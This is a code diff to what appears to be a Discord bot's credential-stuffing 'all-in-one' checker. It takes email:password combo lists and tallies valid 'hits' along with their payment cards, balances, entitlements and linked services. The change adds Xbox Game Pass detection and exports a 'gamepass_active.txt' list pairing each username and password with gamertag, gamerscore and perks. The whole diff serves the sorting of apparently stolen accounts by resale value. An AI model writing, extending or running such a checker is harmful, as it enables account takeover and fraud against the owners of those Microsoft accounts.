@@ -1589,7 +1589,7 @@ async function handleBetaAio(respond, userId, accountsRaw, accountsFile, threads
     const accounts = await gatherCombos(accountsRaw, accountsFile);
     if (!accounts.length) return respond({ embeds: [errorEmbed("No valid accounts provided.")] });
 
-    const live = { hits: 0, empty: 0, fails: 0, receipts: 0, cards: 0, entitlements: 0, linked: 0 };
+    const live = { hits: 0, empty: 0, fails: 0, receipts: 0, cards: 0, entitlements: 0, linked: 0, gamepass: 0 };
     const msg = await respond({ embeds: [betaAioProgressEmbed(0, accounts.length, live)], components: [stopButton(userId)], fetchReply: true });
     const t0 = Date.now();
     let lastEdit = 0;
@@ -1601,6 +1601,7 @@ async function handleBetaAio(respond, userId, accountsRaw, accountsFile, threads
         live.cards += r.payment?.paymentMethods?.length || 0;
         live.entitlements += r.entitle?.entitlements?.length || 0;
         live.linked += r.bridge?.linkedCount || 0;
+        if (r.bridge?.services?.GamePass?.linked) live.gamepass++;
       } else if (r?.status === "empty") live.empty++;
       else live.fails++;
 
@@ -1615,7 +1616,7 @@ async function handleBetaAio(respond, userId, accountsRaw, accountsFile, threads
     const files = [];
 
     let totalReceipts = 0, totalSpent = 0, totalCards = 0, totalSubs = 0;
-    let totalEntitlements = 0, totalValue = 0, totalLinks = 0, totalPoints = 0;
+    let totalEntitlements = 0, totalValue = 0, totalLinks = 0, totalPoints = 0, totalGamePass = 0;
 
     // ── Build per-account summary (main file) ──
     if (hits.length > 0) {
@@ -1628,6 +1629,7 @@ async function handleBetaAio(respond, userId, accountsRaw, accountsFile, threads
         totalValue += parseFloat(h.entitle?.totalValue || 0);
         totalLinks += h.bridge?.linkedCount || 0;
         totalPoints += parseInt(h.payment?.points || 0, 10);
+        if (h.bridge?.services?.GamePass?.linked) totalGamePass++;
 
         let block = `${"═".repeat(50)}\n`;
         block += `Email: ${h.user}\nPassword: ${h.password}\n`;
@@ -1718,6 +1720,17 @@ async function handleBetaAio(respond, userId, accountsRaw, accountsFile, threads
         const lines = balanceHits.map(h => `${h.user}:${h.password} | Balance: $${h.payment.balance}`);
         files.push(textAttachment(lines, "balance_hits.txt"));
       }
+
+      const gpHits = hits.filter(h => h.bridge?.services?.GamePass?.linked);
+      if (gpHits.length) {
+        const lines = gpHits.map(h => {
+          const gp = h.bridge.services.GamePass;
+          const gt = h.bridge.services.Xbox?.gamertag || "N/A";
+          const gs = h.bridge.services.Xbox?.gamerscore || "0";
+          return `${h.user}:${h.password} | GT: ${gt} | GS: ${gs} | Perks: ${gp.offerCount}`;
+        });
+        files.push(textAttachment(lines, "gamepass_active.txt"));
+      }
     }
 
     // ZIP all files if more than 1
@@ -1734,7 +1747,7 @@ async function handleBetaAio(respond, userId, accountsRaw, accountsFile, threads
     const stats = {
       total: accounts.length, hits: hits.length, empty: results.filter(r => r.status === "empty").length,
       fails: results.filter(r => r.status === "fail").length,
-      totalReceipts, totalSpent: totalSpent.toFixed(2), totalCards, totalSubs,
+      totalReceipts, totalSpent: totalSpent.toFixed(2), totalCards, totalSubs, totalGamePass,
       totalEntitlements, totalValue: totalValue.toFixed(2), totalLinks, totalPoints, elapsed,
     };
     const embed = betaAioResultsEmbed(stats);
